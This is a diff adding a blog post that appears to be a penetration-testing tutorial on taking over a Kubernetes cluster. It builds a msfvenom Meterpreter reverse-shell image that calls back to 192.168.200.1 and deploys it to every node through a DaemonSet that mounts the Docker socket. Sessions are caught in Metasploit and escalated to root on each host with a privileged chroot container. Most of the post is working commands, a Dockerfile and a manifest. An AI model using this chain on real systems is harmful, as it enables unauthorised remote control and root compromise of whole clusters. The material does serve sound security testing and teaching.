@@ -1,0 +1,165 @@
+<p>Following on from the <a href="https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/">last post</a> in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.</p>
+
+<p>The scenario here is that we’ve got the ability to create a <code class="highlighter-rouge">daemonset</code> object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.</p>
+
+<p>To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the <a href="https://www.metasploit.com/">Metasploit Framework</a> and specifically, <code class="highlighter-rouge">exploit/multi/handler</code></p>
+
+<h2 id="step-1-create-the-payload">Step 1: Create the payload</h2>
+
+<p>We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we’re going to setup and will run on each node in the cluster.</p>
+
+<p>For this we can run msfvenom to setup our payload and then embed that into a Docker image.</p>
+
+<p>In this case our pentester machine will be on <code class="highlighter-rouge">192.168.200.1</code> . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.</p>
+
+<p>This command will generate our payload</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &gt; reverse_shell.elf
+</code></pre></div></div>
+
+<h3 id="setting-up-the-docker-image">Setting up the Docker Image</h3>
+
+<p>Next run this command to get the Docker GPG key into your directory</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://download.docker.com/linux/ubuntu/gpg &gt; docker.gpg
+</code></pre></div></div>
+
+<p>We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM ubuntu:18.04
+
+RUN apt update &amp;&amp; apt install -y apt-transport-https ca-certificates curl software-properties-common
+
+COPY docker.gpg /docker.gpg
+
+RUN apt-key add /docker.gpg
+
+RUN add-apt-repository \
+   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
+   $(lsb_release -cs) \
+   stable"
+
+RUN apt-get install -y docker-ce-cli
+
+COPY reverse_shell.elf /reverse_shell.elf
+
+RUN chmod +x /reverse_shell.elf
+
+CMD ["/reverse_shell.elf"]
+</code></pre></div></div>
+
+<p>Build it with (replace raesene below with your own docker hub name)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker build -t raesene/reverse_shell .
+</code></pre></div></div>
+
+<p>Then you can login to Docker hub with <code class="highlighter-rouge">docker login</code> and upload with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker push raesene/reverse_shell
+</code></pre></div></div>
+
+<p>At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.</p>
+
+<h2 id="step-2-setting-up-metasploit-to-receive-our-shells">Step 2: Setting up Metasploit to receive our shells</h2>
+
+<p>On the pentester machine start-up the metasploit console with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+
+<p>then</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+</code></pre></div></div>
+
+<p>and set our variables, in the same way we did with <code class="highlighter-rouge">msfvenom</code> earlier</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set payload linux/x64/meterpreter_reverse_http
+set LHOST 192.168.200.1
+set LPORT 8989
+set ExitOnSession false
+</code></pre></div></div>
+
+<p>With those set, we can start it up to listen for incoming shells</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit -j
+</code></pre></div></div>
+
+<p>Now on a target machine run our shell and we should get that back on the metasploit console</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run raesene/reverse_shell
+</code></pre></div></div>
+
+<p>Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster</p>
+
+<h2 id="step-3-using-a-daemonset-to-compromise-a-cluster">Step 3: Using a Daemonset to compromise a cluster</h2>
+
+<p>So we want a workload which will run on every node in the cluster, and that’s exactly what a daemonset will do for us.  We’ll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.</p>
+
+<p>This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.</p>
+
+<p>We’ll call our manifest <code class="highlighter-rouge">reverse-shell-daemonset.yml</code> and it should contain this :-</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: reverse-shell-daemonset
+  labels:
+spec:
+  selector:
+    matchLabels:
+      name: reverse-shell-daemonset
+  template:
+    metadata:
+      labels:
+        name: reverse-shell-daemonset
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      containers:
+      - name: revshell
+        image: raesene/reverse-shell
+        volumeMounts:
+        - mountPath: /var/run/docker.sock
+          name: dockersock
+      volumes:
+      - name: dockersock
+        hostPath:
+          path: /var/run/docker.sock
+</code></pre></div></div>
+
+<p>Once you’ve got your manifest ready, just apply it to the cluster with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create -f reverse-shell-daemonset.yml
+</code></pre></div></div>
+
+<p>Back on your metasploit console you should see your shells pop in, one for each node :)</p>
+
+<h3 id="getting-to-root-on-the-nodes">Getting to root on the nodes</h3>
+
+<p>So once you’ve got your shells working, you can interact with them from the Metasploit console</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions -l 
+</code></pre></div></div>
+
+<p>Will show you your active sessions.  Then</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions -i 1
+</code></pre></div></div>
+
+<p>Will let you interact with one of them</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+
+<p>should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.</p>
+
+<p>To Do this we can juse make use of the every handy <a href="https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/">Most Pointless Docker Command Ever</a></p>
+
+<p>Running</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
+</code></pre></div></div>
+
+<p>and it’ll dump us out to a root shell on the underlying node :)</p>
